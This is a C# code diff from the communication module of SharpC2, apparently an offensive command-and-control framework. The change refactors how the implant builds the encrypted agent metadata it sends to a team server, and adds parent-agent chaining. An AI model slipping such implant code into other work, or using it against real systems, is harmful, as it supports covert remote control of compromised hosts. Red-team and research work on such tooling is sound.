@@ -4,7 +4,7 @@ using System.Net;
 
 abstract class CommModule
 {
-    static string AgentID;
+    public AgentMetadata Metadata { get; private set; }
     public ModuleStatus ModuleStatus { get; private set; } = ModuleStatus.Stopped;
 
     protected CryptoController Crypto;
@@ -13,11 +13,6 @@ abstract class CommModule
 
     static int MaxRetryCount = 5000;
     static int RetryCount = 0;
-
-    public CommModule(string agentID)
-    {
-        AgentID = agentID;
-    }
 
     public virtual void Start(CryptoController crypto)
     {
@@ -57,7 +52,7 @@ abstract class CommModule
     public virtual WebClient GetWebClient()
     {
         var client = new WebClient();
-        var metadata = Crypto.Encrypt(GetMetadata());
+        var metadata = Crypto.Encrypt(Metadata);
 
         client.Headers.Clear();
         client.Headers.Add("X-Malware", "SharpC2");
@@ -66,12 +61,14 @@ abstract class CommModule
         return client;
     }
 
-    public virtual AgentMetadata GetMetadata()
+    public virtual void SetMetadata(string agentID)
     {
-        return new AgentMetadata
-        {
-            AgentID = AgentID
-        };
+        Metadata = new AgentMetadata { AgentID = agentID };
+    }
+
+    public virtual void SetParentID(string parentID)
+    {
+        Metadata.ParentAgentID = parentID;
     }
 
     public virtual void ProcessTeamServerResponse(byte[] response)
